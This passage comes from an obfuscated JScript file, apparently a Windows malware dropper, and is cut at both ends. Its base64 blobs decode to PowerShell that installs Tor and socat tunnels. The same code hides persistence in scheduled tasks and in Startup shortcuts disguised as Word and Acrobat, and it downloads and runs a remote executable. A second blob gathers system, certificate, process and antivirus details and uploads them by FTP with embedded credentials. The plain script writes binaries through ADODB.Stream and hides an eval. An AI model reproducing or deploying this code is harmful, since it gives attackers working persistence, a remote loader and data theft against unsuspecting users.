mtfcGF0aCwgW3N0cmluZ10kYXJndW1lbnRzPSIiKTsKICAgIAogICAgJF9wYXRoPVNwbGl0LVBhdGggJGRlc3RfcGF0aDsKICAgIGlmICgtTm90IChUZXN0LVBhdGggJF9wYXRoKSl7CiAgICAgICAgbWtkaXIgLUZvcmNlICRfcGF0aDsKICAgIH0KICAgIGlmICgtTm90IChUZXN0LVBhdGggJHRhcmdldF9wYXRoKSl7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJDYW4ndCBhZGQgc2hvcnRjdXQuIFRhcmdldCBwYXRoICckdGFyZ2V0X3BhdGgnIG5vdCBmb3VuZC4iOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIGlmICgoVGVzdC1QYXRoICRkZXN0X3BhdGgpKXsKICAgICAgICBXcml0ZS1PdXRwdXQgIkNhbid0IGFkZCBzaG9ydGN1dC4gRGVzdGluYXRpb24gcGF0aCAnJGRlc3RfcGF0aCcgZXhpc3QuIjsKICAgICAgICByZXR1cm47CiAgICB9CgogICAgJF9zaGVsbCA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCAoIldTY3JpcHQuU2hlbGwiKTsKICAgICRfc2hvcnRjdXQgPSAkX3NoZWxsLkNyZWF0ZVNob3J0Y3V0KCRkZXN0X3BhdGgpOwogICAgJF9zaG9ydGN1dC5UYXJnZXRQYXRoPSR0YXJnZXRfcGF0aDsKICAgIGlmKC1Ob3QgW1N0cmluZ106OklzTnVsbE9yRW1wdHkoJGFyZ3VtZW50cykpewogICAgICAgICRfc2hvcnRjdXQuQXJndW1lbnRzPSRhcmd1bWVudHM7CiAgICB9CiAgICAkX3Nob3J0Y3V0LldvcmtpbmdEaXJlY3Rvcnk9JHdvcmtfcGF0aDsKICAgICRfc2hvcnRjdXQuU2F2ZSgpOwp9CgpmdW5jdGlvbiBSYW5kb21TdHJpbmd7CiAgICBwYXJhbShbaW50XSRtaW49NSwgW2ludF0kbWF4PTE1KTsKICAgIHJldHVybiAoLWpvaW4gKCg0OC4uNTcpKyg2NS4uOTApKyg5Ny4uMTIyKSB8IEdldC1SYW5kb20gLUNvdW50IChHZXQtUmFuZG9tIC1taW5pbXVtICRtaW4gLW1heGltdW0gJG1heCkgfCAlIHtbY2hhcl0kX30pKTsKfQpmdW5jdGlvbiBJbml0U2NoZWR1bGxlcnsKICAgIHRyeXsKICAgICAgICBJbXBvcnQtTW9kdWxlIFNjaGVkdWxlZFRhc2tzIC1FcnJvckFjdGlvbiBTdG9wOwogICAgICAgIHJldHVybiAkU0hfVFlQRV9TQ0hFRFVMRURfVEFTSzsKICAgIH1jYXRjaHsKICAgICAgICAkRmlsZT0kZW52OkFMTFVTRVJTUFJPRklMRSsnXHRzLjd6JzsKICAgICAgICAkRGVzdD0kZW52OkFMTFVTRVJTUFJPRklMRSsnXCcrKFJhbmRvbVN0cmluZyk7CiAgICAgICAgaWYgKChUZXN0LVBhdGggJERlc3QpIC1lcSAxKXtSZW1vdmUtSXRlbSAtRm9yY2UgLVJlY3Vyc2UgJERlc3Q7fW1rZGlyICREZXN0IHwgT3V0LU51bGw7CiAgICAgICAgRENvam1vTyAkRmlsZSAkRGVzdDsKICAgICAgICBSZW1vdmUtSXRlbSAtRm9yY2UgJEZpbGU7CiAgICAgICAgJFRTQXNzZW1ibHk9JERlc3QrJ1xNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5kbGwnOwogICAgICAgICRsb2FkTGliID0gW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZEZpbGUoJFRTQXNzZW1ibHkpOwogICAgICAgIHJldHVybiAkU0hfVFlQRV9UQVNLX1NDSEVEVUxFUjsKICAgIH0KfQpmdW5jdGlvbiBBb2dQT0ZyRWhjCnsKcGFyYW0oW3N0cmluZ10kbmFtZSwgW3N0cmluZ10kY21kLCBbc3RyaW5nXSRwYXJhbXM9JycsW2ludF0kcmVzdGFydD0wLFtpbnRdJGRlbGF5PTAsW3N0cmluZ10kZGlyPScnKTsKc3dpdGNoICgkc2NoZWR1bGVyVHlwZSkgewogICAgJFNIX1RZUEVfU0NIRURVTEVEX1RBU0sgewogICAgICAgIHRyeXsKICAgICAgICAgICAgJEFjdGlvbiA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICRjbWQ7CiAgICAgICAgICAgIGlmKC1Ob3QgW1N0cmluZ106OklzTnVsbE9yRW1wdHkoJHBhcmFtcykpewogICAgICAgICAgICAgICAgJEFjdGlvbi5Bcmd1bWVudHM9JHBhcmFtczsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigtTm90IFtTdHJpbmddOjpJc051bGxPckVtcHR5KCRkaXIpKXsKICAgICAgICAgICAgICAgICRBY3Rpb24uV29ya2luZ0RpcmVjdG9yeT0kZGlyOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRMb2dvblRyaWdnZXIgPSBOZXctU2NoZWR1bGVkVGFza1RyaWdnZXIgLUF0TG9nT247CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgICRMb2dvblRyaWdnZXIuVXNlcklkPSRlbnY6dXNlcm5hbWU7CiAgICAgICAgICAgIH1jYXRjaHsKICAgICAgICAgICAgICAgICRMb2dvblRyaWdnZXIuVXNlcj0kZW52OnVzZXJuYW1lOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKC1Ob3QgJGRlbGF5IC1lcSAwKXsKICAgICAgICAgICAgICAgICRMb2dvblRyaWdnZXIuRGVsYXk9TmV3LVRpbWVTcGFuIC1TZWNvbmRzICRkZWxheTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkcmVzdGFydCAtZXEgMSl7CiAgICAgICAgICAgICAgICAkVGltZVRyaWdnZXIgPSBOZXctU2NoZWR1bGVkVGFza1RyaWdnZXIgLU9uY2UgLUF0IDEyYW0gLVJlcGV0aXRpb25JbnRlcnZhbCAoW1N5c3RlbS5UaW1lU3Bhbl06OkZyb21NaW51dGVzKDEpKSAtUmVwZXRpdGlvbkR1cmF0aW9uIChbU3lzdGVtLlRpbWVTcGFuXTo6RnJvbURheXMoMzY1ICogMjApKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkU2V0dGluZ3MgPSBOZXctU2NoZWR1bGVkVGFza1NldHRpbmdzU2V0OwogICAgICAgICAgICAkU2V0dGluZ3MuRGlzYWxsb3dTdGFydElmT25CYXR0ZXJpZXMgPSAkRmFsc2U7CiAgICAgICAgICAgICRTZXR0aW5ncy5TdG9wSWZHb2luZ09uQmF0dGVyaWVzID0gJEZhbHNlOwogICAgICAgICAgICBpZigkcmVzdGFydCAtZXEgMSl7CiAgICAgICAgICAgICAgICAkVGFzayA9IFJlZ2lzdGVyLVNjaGVkdWxlZFRhc2sgLUFjdGlvbiAkQWN0aW9uIC1UcmlnZ2VyICRMb2dvblRyaWdnZXIsJFRpbWVUcmlnZ2VyIC1TZXR0aW5ncyAkU2V0dGluZ3MgLVRhc2tOYW1lICRuYW1lIC1EZXNjcmlwdGlvbiAoUmFuZG9tU3RyaW5nKTsKICAgICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICAgICAkVGFzayA9IFJlZ2lzdGVyLVNjaGVkdWxlZFRhc2sgLUFjdGlvbiAkQWN0aW9uIC1UcmlnZ2VyICRMb2dvblRyaWdnZXIgLVNldHRpbmdzICRTZXR0aW5ncyAtVGFza05hbWUgJG5hbWUgLURlc2NyaXB0aW9uIChSYW5kb21TdHJpbmcpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFN0YXJ0LVNjaGVkdWxlZFRhc2sgLUlucHV0T2JqZWN0ICRUYXNrOwogICAgICAgIH1jYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICRfIC1FcnJvckFjdGlvbiBDb250aW51ZTsKICAgICAgICB9CiAgICB9OwogICAgRGVmYXVsdCB7CiAgICAgICAgdHJ5ewogICAgICAgICAgICAkdHM9TmV3LU9iamVjdCBNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5UYXNrU2VydmljZTsKICAgICAgICAgICAgJHRkPSR0cy5OZXdUYXNrKCk7CiAgICAgICAgICAgICR0ZC5SZWdpc3RyYXRpb25JbmZvLkRlc2NyaXB0aW9uID0gKFJhbmRvbVN0cmluZyk7CiAgICAgICAgICAgICR0ZC5TZXR0aW5ncy5EaXNhbGxvd1N0YXJ0SWZPbkJhdHRlcmllcyA9ICRGYWxzZTsKICAgICAgICAgICAgJHRkLlNldHRpbmdzLlN0b3BJZkdvaW5nT25CYXR0ZXJpZXMgPSAkRmFsc2U7CiAgICAgICAgICAgICR0ZC5TZXR0aW5ncy5NdWx0aXBsZUluc3RhbmNlcyA9IFtNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5UYXNrSW5zdGFuY2VzUG9saWN5XTo6SWdub3JlTmV3OwogICAgICAgICAgICAkTG9nb25UcmlnZ2VyID0gTmV3LU9iamVjdCBNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5Mb2dvblRyaWdnZXI7CiAgICAgICAgICAgICRMb2dvblRyaWdnZXIuU3RhcnRCb3VuZGFyeT1bU3lzdGVtLkRhdGVUaW1lXTo6Tm93OwogICAgICAgICAgICAkTG9nb25UcmlnZ2VyLlVzZXJJZD0kZW52OnVzZXJuYW1lOwogICAgICAgICAgICAkTG9nb25UcmlnZ2VyLkRlbGF5PVtTeXN0ZW0uVGltZVNwYW5dOjpGcm9tU2Vjb25kcygkZGVsYXkpOwogICAgICAgICAgICAkdGQuVHJpZ2dlcnMuQWRkKCRMb2dvblRyaWdnZXIpOwogICAgICAgICAgICBpZigkcmVzdGFydCAtZXEgMSl7CiAgICAgICAgICAgICRUaW1lVHJpZ2dlciA9IE5ldy1PYmplY3QgTWljcm9zb2Z0LldpbjMyLlRhc2tTY2hlZHVsZXIuVGltZVRyaWdnZXI7CiAgICAgICAgICAgICRUaW1lVHJpZ2dlci5TdGFydEJvdW5kYXJ5PVtTeXN0ZW0uRGF0ZVRpbWVdOjpOb3c7CiAgICAgICAgICAgICRUaW1lVHJpZ2dlci5SZXBldGl0aW9uLkludGVydmFsPVtTeXN0ZW0uVGltZVNwYW5dOjpGcm9tTWludXRlcygxKTsKICAgICAgICAgICAgJFRpbWVUcmlnZ2VyLlJlcGV0aXRpb24uU3RvcEF0RHVyYXRpb25FbmQ9JEZhbHNlOwogICAgICAgICAgICAkdGQuVHJpZ2dlcnMuQWRkKCRUaW1lVHJpZ2dlcik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHRzZj0iTWljcm9zb2Z0LldpbjMyLlRhc2tTY2hlZHVsZXIiOwogICAgICAgICAgICAkRXhlY0FjdGlvbj1OZXctT2JqZWN0ICIkdHNmLkV4ZWNBY3Rpb24iKCRjbWQsJHBhcmFtcywkZGlyKTsKICAgICAgICAgICAgJHRkLkFjdGlvbnMuQWRkKCRFeGVjQWN0aW9uKTsKICAgICAgICAgICAgJHRhc2s9JHRzLlJvb3RGb2xkZXIuUmVnaXN0ZXJUYXNrRGVmaW5pdGlvbigkbmFtZSwgJHRkKTsKICAgICAgICAgICAgJHRhc2suUnVuKCk7CiAgICAgICAgfWNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtRXJyb3IgJF8gLUVycm9yQWN0aW9uIENvbnRpbnVlOwogICAgICAgIH0KICAgIH07Cn0KfQpmdW5jdGlvbiB6WFdTaFVSbWt7CiRzY2hlZHVsZXJUeXBlID0gSW5pdFNjaGVkdWxsZXI7CiR0Zj0kZW52OkFMTFVTRVJTUFJPRklMRSsnXHRvci13aW4zMi0wLjMuMy45Ljd6JzsKJERlc3RUUD0kZW52OkFMTFVTRVJTUFJPRklMRSsnXCcrKFJhbmRvbVN0cmluZyk7CmlmICgoVGVzdC1QYXRoICREZXN0VFApIC1lcSAxKXtSZW1vdmUtSXRlbSAtRm9yY2UgLVJlY3Vyc2UgJERlc3RUUDt9bWtkaXIgJERlc3RUUCB8IE91dC1OdWxsOwpEQ29qbW9PICR0ZiAkRGVzdFRQOwpSZW1vdmUtSXRlbSAtRm9yY2UgJHRmOwokcHZpaXlMPSREZXN0VFArJ1xUb3JcJzsKJFdiY1FxTz0idmJzY3JpcHQ6Y2xvc2UoQ3JlYXRlT2JqZWN0KGAiV1NjcmlwdC5TaGVsbGAiKS5SdW4oYCJ0b3IuZXhlYCIsMCxGYWxzZSkpIjsKQW9nUE9GckVoYyAoUmFuZG9tU3RyaW5nKSAnbXNodGEuZXhlJyAkV2JjUXFPIDAgMCAkcHZpaXlMOwoKQWRkLVNob3J0Y3V0ICIkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpTeXN0ZW1EaXJlY3RvcnkpXG1zaHRhLmV4ZSIgIiQoW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ1N0YXJ0dXAnKSlcbXN3b3JkLmxuayIgJHZ6ZmtGY2F3RGJJVVN5YSAkdG9hd3d5SmxqQwoKJGRTZlZ6cz0kZW52OkFMTFVTRVJTUFJPRklMRSsnXHNvY2F0LXdpbmRvd3MtMS43LjIuMS43eic7CiRndHFyWnpXYk11T2djTT0oUmFuZG9tU3RyaW5nKTsKRENvam1vTyAkZFNmVnpzICREZXN0VFA7CiRXV1NHUD0kRGVzdFRQKydcc29jYXQtd2luZG93cy0xLjcuMi4xXCc7ClJlbmFtZS1JdGVtIC1wYXRoICRXV1NHUCAtbmV3TmFtZSAkZ3Rxclp6V2JNdU9nY007CiRWUUZVRmJpTGZJSj0kRGVzdFRQKydcJyskZ3Rxclp6V2JNdU9nY00rJ1wnOwpSZW1vdmUtSXRlbSAtRm9yY2UgJGRTZlZ6czsKJHMxY21kPSdzb2NhdCB0Y3A0LUxJU1RFTjozNzAzMSxyZXVzZWFkZHIsZm9yayxrZWVwYWxpdmUsYmluZD0xMjcuMC4wLjEgU09DS1M0QToxMjcuMC4wLjE6JURPTUFJTiU6ODAsc29ja3Nwb3J0PTkwNTAnOwokczJjbWQ9J3NvY2F0IHRjcDQtTElTVEVOOjU1ODgscmV1c2VhZGRyLGZvcmssa2VlcGFsaXZlLGJpbmQ9MTI3LjAuMC4xIFNPQ0tTNEE6MTI3LjAuMC4xOiVET01BSU4lOjU1ODgsc29ja3Nwb3J0PTkwNTAnOwokdm5xTlh0PSJ2YnNjcmlwdDpjbG9zZShDcmVhdGVPYmplY3QoYCJXU2NyaXB0LlNoZWxsYCIpLlJ1bihgIiRzMWNtZGAiLDAsRmFsc2UpKSI7CiR3TGhTZXNFZ2tpdT0idmJzY3JpcHQ6Y2xvc2UoQ3JlYXRlT2JqZWN0KGAiV1NjcmlwdC5TaGVsbGAiKS5SdW4oYCIkczJjbWRgIiwwLEZhbHNlKSkiOwpBb2dQT0ZyRWhjIChSYW5kb21TdHJpbmcpICdtc2h0YS5leGUnICR2bnFOWHQgMCAwICRWUUZVRmJpTGZJSjsKQW9nUE9GckVoYyAoUmFuZG9tU3RyaW5nKSAnbXNodGEuZXhlJyAkd0xoU2VzRWdraXUgMCAwICRWUUZVRmJpTGZJSjsKCkFkZC1TaG9ydGN1dCAiJChbU3lzdGVtLkVudmlyb25tZW50XTo6U3lzdGVtRGlyZWN0b3J5KVxtc2h0YS5leGUiICIkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdTdGFydHVwJykpXGFjcm9iYXQubG5rIiAkVlFGVUZiaUxmSUogJHZucU5YdApBZGQtU2hvcnRjdXQgIiQoW1N5c3RlbS5FbnZpcm9ubWVudF06OlN5c3RlbURpcmVjdG9yeSlcbXNodGEuZXhlIiAiJChbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnU3RhcnR1cCcpKVxzeW5jLmxuayIgJFZRRlVGYmlMZklKICR3TGhTZXNFZ2tpdQoKJEpjVlJ6Q0hSU3hDZE5aaz0idmJzYyIrInJpcHQ6Y2xvc2UoQ3JlYXRlT2JqZWN0KGAiV1NjcmlwdC5TaGVsbGAiKS5SdW4oYCJwb3dlcnNoZWxsLmV4ZSBgImAiYCRGPWAkZW52OlRlbXArJ1xcIisoUmFuZG9tU3RyaW5nKSsiLmV4ZSc7cm0gLUZvcmNlIGAkRjtgJGNsPShOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpO2AkY2wuRG93bmxvYWRGaWxlKCdodHRwOi8vMTI3LjAuMC4xOjU1NTUvIisoUmFuZG9tU3RyaW5nKSsiLmFzcD90cyZpcD0nK2AkY2wuRG93bmxvYWRgIitgIlN0cmluZygnaHR0cDovL2FwaS5pcGlmeS5vcmcvJyksYCRGKTsmIGAkRmAiYCJgIiwwLEZhbHNlKSkiOwpBb2dQT0ZyRWhjIChSYW5kb21TdHJpbmcpICdtc2h0YS5leGUnICRKY1ZSekNIUlN4Q2ROWmsgMTsKI1NldCBkaXJlY3RvcnkgcGVybWlzc2lvbnMKJFJpZ2h0cyA9ICJSZWFkLCBSZWFkQW5kRXhlY3V0ZSwgTGlzdERpcmVjdG9yeSI7CiRhY2wgPSBHZXQtQWNsICRldWNJUXFyc1M7CiRhY2x8U2VsZWN0IC1leHBhbmQgQWNjZXNzfEZvckVhY2gtT2JqZWN0IHsKICAgICRwZXJtID0gJF8uSWRlbnRpdHlSZWZlcmVuY2UsICRSaWdodHMsICRfLkluaGVyaXRhbmNlRmxhZ3MsICRfLlByb3BhZ2F0aW9uRmxhZ3MsICJBbGxvdyI7CiAgICAkcnVsZSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkZpbGVTeXN0ZW1BY2Nlc3NSdWxlIC1Bcmd1bWVudExpc3QgJHBlcm07CiAgICAkYWNsLlNldEFjY2Vzc1J1bGUoJHJ1bGUpOwp9CiRhY2wuU2V0QWNjZXNzUnVsZVByb3RlY3Rpb24oJFRydWUsICRGYWxzZSk7CiRhY2wgfCBTZXQtQWNsIC1QYXRoICRldWNJUXFyc1M7Cn0KelhXU2hVUm1rOw==",
	pbJK: "JExvZ2ZpbGUgPSAkZW52OlRlbXArIlxcJChnYyBlbnY6Y29tcHV0ZXJuYW1lKS5sb2ciOwoKRnVuY3Rpb24gTG9nV3JpdGUKewogIFBhcmFtIChbc3RyaW5nXSRsb2dzdHJpbmcpCiAgJGR0PUdldC1EYXRlIC1Gb3JtYXQgImRkLk1NLnl5eXkgSEg6bW06c3MiOwogICRtc2c9W3N0cmluZ106OkZvcm1hdCgiW3swfV06Olt7MX1dIiwkZHQsJGxvZ3N0cmluZyk7CiAgV3JpdGUtSG9zdCAkbXNnOwogIEFkZC1jb250ZW50ICRMb2dmaWxlIC12YWx1ZSAkbXNnOwp9CkZ1bmN0aW9uIFVwbG9hZExvZwp7CiAgJGRlc3QgPSAiZnRwOi8vZXMwMDItMTc3MzpXSjJ0RDZpQjFkT2NAc3YxMi5lLXNob3BzLmpwL2h0dHBkb2NzL2xvZ3MiOwogICR3YyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5OZXQuV2ViQ2xpZW50OwogICR3Yy5VcGxvYWRGaWxlKCIkZGVzdC8kKGdjIGVudjpjb21wdXRlcm5hbWUpLmxvZyIsICRMb2dmaWxlKTsKICBSZW1vdmUtSXRlbSAtUGF0aCAkTG9nZmlsZTsKfQpmdW5jdGlvbiBDaGVja0luc3RhbGwoKXsKICAkd2luaW5mbyA9IChHZXQtV21pT2JqZWN0IFdpbjMyX09wZXJhdGluZ1N5c3RlbSB8IFNlbGVjdCBDYXB0aW9uLCBTZXJ2aWNlUGFja01ham9yVmVyc2lvbiwgT1NBcmNoaXRlY3R1cmUsIFZlcnNpb24sIE1VSUxhbmd1YWdlcyk7CiAgJHdpbmluZm8uTVVJTGFuZ3VhZ2VzPSR3aW5pbmZvLk1VSUxhbmd1YWdlcyAtam9pbiAiLCI7CiAgTG9nV3JpdGUoIk9TIGluZm86IHswfSIgLWYgJHdpbmluZm8gLWpvaW4gIiIpOwogIGlmICh0ZXN0LXBhdGggdmFyaWFibGU6cHN2ZXJzaW9udGFibGUpIHsKICAgICR2ZXJzaW9uID0gJHBzdmVyc2lvbnRhYmxlLnBzdmVyc2lvbjsKICB9IGVsc2UgewogICAgJHZlcnNpb24gPSBbdmVyc2lvbl0iMS4wLjAuMCI7CiAgfQogIExvZ1dyaXRlKCJQb3dlcnNoZWxsIHZlcnNpb246IHswfSIgLWYgJHZlcnNpb24pOwogIHRyeSB7CiAgICAkcGFjPUdldC1JdGVtUHJvcGVydHkgJ2hrY3U6XFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxJbnRlcm5ldCBTZXR0aW5nc1wnfFNlbGVjdCAtZXhwYW5kIEF1dG9Db25maWdVUkwgLUVycm9yQWN0aW9uIFN0b3A7CiAgICBMb2dXcml0ZSgiUGFjIHNldHRlZDogJyRwYWMnIik7CiAgfQogIGNhdGNoIHsKICAgIExvZ1dyaXRlKCJFUlJPUjogUGFjIG5vdCBzZXR0ZWQiKTsKICB9CiAgJENlcnRzID0gQChHZXQtQ2hpbGRJdGVtIGNlcnQ6XEN1cnJlbnRVc2VyXFJPT1R8V2hlcmUtT2JqZWN0IHskXy5TdWJqZWN0IC1saWtlICIqQ09NT0RPIFJTQSBFeHRlbmRlZCBWYWxpZGF0aW9uIFNlY3VyZSBTZXJ2ZXIgQ0EgMioiIC1vciAkXy5TdWJqZWN0IC1saWtlICIqQ09NT0RPIENlcnRpZmljYXRpb24gQXV0aG9yaXR5KiJ9fEZvckVhY2gtT2JqZWN0IHsiezB9ICh7MX0pIiAtZiAoJF8uVGh1bWJwcmludCwkXy5Ob3RCZWZvcmUpfSk7CiAgaWYgKC1OT1QgJENlcnRzLmNvdW50IC1lcSAwKXsKICAgIExvZ1dyaXRlKCJDZXJ0cyBpbnN0YWxsZWQ6ICd7MH0nIiAtZiAoJENlcnRzIC1qb2luICI7ICIpKTsKICB9ZWxzZSB7CiAgICBMb2dXcml0ZSgiQ2VydHMgbm90IGZvdW5kIik7CiAgfQogIHRyeXsKICAgICRwcm9jID0gR2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyRfLlByb2Nlc3NOYW1lIC1saWtlICJ0b3IqIiAtb3IgJF8uUHJvY2Vzc05hbWUgLWxpa2UgInNvY2F0KiJ9fFNlbGVjdCAtUHJvcGVydHkgQHsgTmFtZT0iT3V0IjsgRXhwcmVzc2lvbj17IklEOnswfWBuTmFtZTp7MX1gblBhdGg6ezJ9YG4tLS0tLS0tLS0tLS0tIiAtZiAkXy5JZCwkXy5Qcm9jZXNzTmFtZSwkXy5QYXRofX18U2VsZWN0IC1leHBhbmQgT3V0OwogICAgTG9nV3JpdGUoIlByb2NjZXNzIGxpc3Q6YG57MH0iIC1mICgkcHJvYyAtam9pbiAiYG4iKSk7CiAgfQogIGNhdGNoIHsKICAgIExvZ1dyaXRlKCJFUlJPUjogQ2FuJ3QgZ2V0IHByb2NjZXNzIGxpc3QiKTsKICB9CiAgJERlc3RUUD0kZW52OkFMTFVTRVJTUFJPRklMRTsKICB0cnl7CiAgICAkZGlycz1kaXIoJERlc3RUUCkgLUVycm9yQWN0aW9uIFN0b3A7CiAgICBMb2dXcml0ZSgiTGlzdCBkaXIgW3swfV06IHsxfSIgLWYgKCREZXN0VFAsICgoJGRpcnN8U2VsZWN0IC1leHBhbmQgTmFtZSkgLWpvaW4gIjsgIikpKTsKICAgIGZvcmVhY2goJGRpciBpbiAkZGlycyl7CiAgICAgICAgdHJ5ewogICAgICAgICAgICAkc3ViZGlyPWRpcigkZGlyLkZ1bGxOYW1lKSAtRXJyb3JBY3Rpb24gU3RvcDsKICAgICAgICAgICAgTG9nV3JpdGUoIkxpc3QgZGlyIFt7MH1dOnsxfSIgLWYgKCRkaXIuRnVsbE5hbWUsICgoJHN1YmRpcnxTZWxlY3QgLWV4cGFuZCBOYW1lKSAtam9pbiAiOyAiKSkpOwogICAgICAgIH0KICAgICAgICBjYXRjaHsKICAgICAgICAgICAgTG9nV3JpdGUoIkVSUk9SOiBDYW4ndCBsaXN0IGRpciB7MH0iIC1mICRkaXIuRnVsbE5hbWUpOwogICAgICAgIH0KICAgIH0KICB9CiAgY2F0Y2ggewogICAgTG9nV3JpdGUoIkVSUk9SOiBDYW4ndCBsaXN0IGRpciB7MH0iIC1mICREZXN0VFApOwogIH0KCiAgJGF2bGlzdD0oR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlICJyb290XFNlY3VyaXR5Q2VudGVyMiIgLVF1ZXJ5ICJTRUxFQ1QgKiBGUk9NIEFudGlWaXJ1c1Byb2R1Y3QiICBAcHNib3VuZHBhcmFtZXRlcnN8U2VsZWN0IC1leHBhbmQgRGlzcGxheU5hbWUpOwogIGlmICgtTk9UICRhdmxpc3QuY291bnQgLWVxIDApewogICAgTG9nV3JpdGUoIkF2IGZvdW5kOiAnezB9JyIgLWYgKCRhdmxpc3QgLWpvaW4gInwgIikpOwogIH1lbHNlIHsKICAgIExvZ1dyaXRlKCJBdiBub3QgZm91bmQiKTsKICB9Cn0KZnVuY3Rpb24gU3RhcnRXb3JrKCl7CiAgTG9nV3JpdGUgIlN0YXJ0IExvZyBtb2R1bGUiOwogIFN0YXJ0LVNsZWVwIC1zIDM7CiAgQ2hlY2tJbnN0YWxsOwogIFVwbG9hZExvZzsKfQpTdGFydFdvcms7Cg=="
};
var LYqwFCpqVfOQ={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=LYqwFCpqVfOQ._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},btGze:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=LYqwFCpqVfOQ._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}};
var FEaWbpCaknAOVso={
	cGxSl:function(puaCnohBnENBWj,ddrZ){
		var ZvuSYRZktRZVdN = new ActiveXObject("ADODB.Stream");
		ZvuSYRZktRZVdN.Open();
		ZvuSYRZktRZVdN.Type=BINARY_STREAM_TYPE;
		
		var JpwnoPOQ = new ActiveXObject("ADODB.Recordset");
		var fUYMpiz=ddrZ.length*2;
		JpwnoPOQ.Fields.Append("data",204,fUYMpiz,0x80);
		JpwnoPOQ.Open();
		JpwnoPOQ.AddNew();
		JpwnoPOQ.Fields("data").AppendChunk(ddrZ);
		JpwnoPOQ.Update();
		JpwnoPOQ.MoveFirst();
		var binArray = JpwnoPOQ("data").GetChunk(fUYMpiz);
		JpwnoPOQ.Close();

		eval("ZvuSYRZktRZVdN.Wri" + "te(bin"+"Array)");
		ZvuSYRZktRZVdN.Position=0;
		
		if(ILmqJnaRb.FileExists(puaCnohBnENBWj)){
			ILmqJnaRb.DeleteFile(puaCnohBnENBWj);
		}
		ZvuSYRZktRZVdN.SaveToFile(puaCnohBnENBWj);
		ZvuSYRZktRZVdN.Close();
		
		var outStreamA = new ActiveXObject("ADODB.Stream");
		var outStreamB = new ActiveXObject("ADODB.Stream");
		outStreamA.Type=TEXT_STREAM_TYPE;
		outStreamB.Type=TEXT_STREAM_TYPE;
		outStreamB.Charset = "ISO-8859-1";
		outStreamA.Open();
		outStreamB.Open();
		outStreamA.LoadFromFile(puaCnohBnENBWj);
		outStreamA.Position = 0; 
		outStreamA.CopyTo(outStreamB);
		outStreamA.Close();
		outStreamB.SaveToFile(puaCnohBnENBWj,CREATE_OVERWRITE_SAVE_MODE);
		outStreamB.Close();
	},
	elDYmjftx: function(m, n){
	    m = parseInt(m,10);
	    n = parseInt(n,10);
	    return Math.floor(Math.random() * (n - m + 1)) + m;
	},
	lqMaq: function(VrXUleB, QlfVHyZjqtK){
        var BmNZYLGnslD = 0;
        var CUzkuGl = "";
        var iSFQGl;
        if (QlfVHyZjqtK === undefined) {
            QlfVHyZjqtK = false;
        }
        while (BmNZYLGnslD < VrXUleB) {
            iSFQGl = (Math.floor((Math.random() * 100)) % 94) + 33;
